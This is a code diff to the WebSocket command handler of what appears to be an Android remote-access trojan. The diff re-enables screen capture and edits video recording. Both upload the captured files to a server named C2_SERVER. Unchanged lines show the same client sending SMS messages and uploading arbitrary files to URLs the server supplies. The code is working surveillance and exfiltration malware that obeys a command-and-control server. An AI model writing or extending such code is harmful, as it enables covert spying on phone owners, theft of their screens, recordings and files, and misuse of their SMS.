@@ -41,7 +41,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
 
     @Override
     public void onMessage(String message) {
-        Log.d("eeee", message);
+//        Log.e("eeee", message);
         try {
             JSONObject req = new JSONObject(message);
 
@@ -115,16 +115,15 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case SCREENSHOT:
-//                    path = Screenshot.captureScreen();
-//                    data = getFileContent(path);
-//                    file = new File(path);
-//
-//                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/screenshots");
-//
-//                    json.put("res", "screenshot");
-//                    json.put("filename", file.getName());
-//                    json.put("timestamp", file.getName().split(".")[0]);
-//                    send(json.toString());
+                    path = Screenshot.captureScreen();
+                    file = new File(path);
+
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/screenshot");
+
+                    json.put("res", "screenshot");
+                    json.put("filename", file.getName());
+                    json.put("timestamp", file.getName().split(".")[0]);
+                    send(json.toString());
                     break;
                 case TEXT:
                     SMS.send(req.getString("number"), req.getString("message"));
@@ -133,14 +132,13 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     FileManager.uploadFile(req.getString("path"), req.getString("url"));
                     break;
                 case VIDEO:
-                    path = Screenshot.captureVideo(context, req.getInt("duration"));
-                    data = getFileContent(path);
+                    path = Screenshot.captureVideo(context, req.getInt("duration"));;
                     file = new File(path);
 
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/videos");
+                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/video");
 
                     json.put("res", "video");
-                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
+                    json.put("filename", file.getName());
                     json.put("timestamp", file.getName().split(".")[0]);
                     send(json.toString());
                     break;
